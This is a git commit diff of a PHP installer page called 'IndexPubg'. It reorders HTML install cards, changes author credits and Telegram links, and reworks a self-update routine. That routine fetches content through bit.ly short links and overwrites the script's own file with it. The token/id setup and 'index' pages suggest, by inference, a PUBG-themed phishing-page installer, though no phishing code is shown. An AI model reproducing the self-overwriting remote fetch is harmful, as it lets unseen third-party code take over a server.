19e3a88c0c9cbaafcba99b88384a59753cce3601
ahmed-shamy <73703631+ahmed-shamy@users.noreply.github.com>
2020-12-20 16:41:41 +0100

    Update and rename V/V1.php to A/pubg.php

--- A/pubg.php
+++ A/pubg.php
@@ -1,8 +1,13 @@
 <?
-if(file_get_contents('https://bit.ly/2H8Vb74') == "true"){
+$info = json_decode(file_get_contents('http://sha-my.xyz/Pubg/info.json'),1)
+$version= $info[info]['version'];
+$v = "1.0.1";
+if($v != $version){
 $iscript = file_get_contents('https://bit.ly/3lJKcQD');
 $index = file_get_contents($iscript);
 $xx = file_put_contents("pubg.php", $index);
+$url1 = "pubg.php";
+header("location: $url1");
 }
 function save($array){
     file_put_contents('Sha_My.json', json_encode($array));
@@ -28,7 +33,7 @@ if((!$token or !$id)and $install){
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-<title>Install IndexPubg - By @PPABB</title>
+<title>Install IndexPubg - By ShaMy</title>
 <link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 </head>
@@ -131,7 +136,6 @@ if(!$install){
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-<meta http-equiv="refresh" content="1">
 <title>Pubg - By @PPABB</title>
 <link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -158,36 +162,6 @@ document.getElementsByClassName("cbalink")[0].style.display = "none";
 </div>
 </center>
 </td>
-<td>
-<center>
-		<div class="card">
-  <img src="https://i.ibb.co/m6B84J9/20201122-101247.png" style="width:100%">
-  <p><a href="pubg.php?index=S"><button>Install</button></a></p>
-</div>
-</center>
-</td>
-</tr>
-</center>
-</table>
-<table border="0" width="100%">
-<center>
-<tr>
-<td>
-		<center>
-		<div class="card">
-  <img src="https://i.ibb.co/zZykRM6/125220142-661503521181538-383095617947085414-n.jpg" style="width:100%">
-  <p><a href="pubg.php?index=MT"><button>Install</button></a></p>
-</div>
-</center>
-</td>
-<td>
-<center>
-		<div class="card">
-  <img src="https://i.ibb.co/3ytqgKJ/125296678-680517802835883-6914515671786880750-n.png" style="width:100%">
-  <p><a href="pubg.php?index=H"><button>Install</button></a></p>
-</div>
-</center>
-</td>
 </tr>
 </center>
 </table>
@@ -203,10 +177,18 @@ document.getElementsByClassName("cbalink")[0].style.display = "none";
 </center>
 </td>
 <td>
-		<center>
+<center>
 		<div class="card">
-  <img src="https://i.ibb.co/L6WTs6V/125487288-183156913358441-703766510766741680-n.png" style="width:100%">
-  <p><a href="pubg.php?index=F"><button>Install</button></a></p>
+  <img src="https://i.ibb.co/3ytqgKJ/125296678-680517802835883-6914515671786880750-n.png" style="width:100%">
+  <p><a href="pubg.php?index=H"><button>Install</button></a></p>
+</div>
+</center>
+</td>
+<td>
+<center>
+		<div class="card">
+  <img src="https://i.ibb.co/BtwFn9n/125303850-183525890088980-1519732218801491935-n.png" style="width:100%">
+  <p><a href="pubg.php?index=M"><button>Install</button></a></p>
 </div>
 </center>
 </td>
@@ -217,13 +199,35 @@ document.getElementsByClassName("cbalink")[0].style.display = "none";
 <center>
 <tr>
 <td>
-<center>
+		<center>
 		<div class="card">
-  <img src="https://i.ibb.co/BtwFn9n/125303850-183525890088980-1519732218801491935-n.png" style="width:100%">
-  <p><a href="pubg.php?index=M"><button>Install</button></a></p>
+  <img src="https://i.ibb.co/L6WTs6V/125487288-183156913358441-703766510766741680-n.png" style="width:100%">
+  <p><a href="pubg.php?index=F"><button>Install</button></a></p>
 </div>
 </center>
 </td>
+<td>
+<center>
+		<div class="card">
+  <img src="https://i.ibb.co/m6B84J9/20201122-101247.png" style="width:100%">
+  <p><a href="pubg.php?index=S"><button>Install</button></a></p>
+</div>
+</center>
+</td>
+<td>
+		<center>
+		<div class="card">
+  <img src="https://i.ibb.co/zZykRM6/125220142-661503521181538-383095617947085414-n.jpg" style="width:100%">
+  <p><a href="pubg.php?index=MT"><button>Install</button></a></p>
+</div>
+</center>
+</td>
+</tr>
+</center>
+</table>
+<table border="0" width="100%">
+<center>
+<tr>
 <td>
 </td>
 </tr>
@@ -233,7 +237,7 @@ document.getElementsByClassName("cbalink")[0].style.display = "none";
 
 <center>
     <br><hr><br>
-   <h5><a href="https://t.me/PPABB"> Developed by @PPABB 👻 </a></h5>
+   <h5><a href="https://t.me/joinchat/AAAAAFJFQs5yrvaaAXkA2w"> Developed by ShaMy </a></h5>
    </center>
 </body>
 </html>
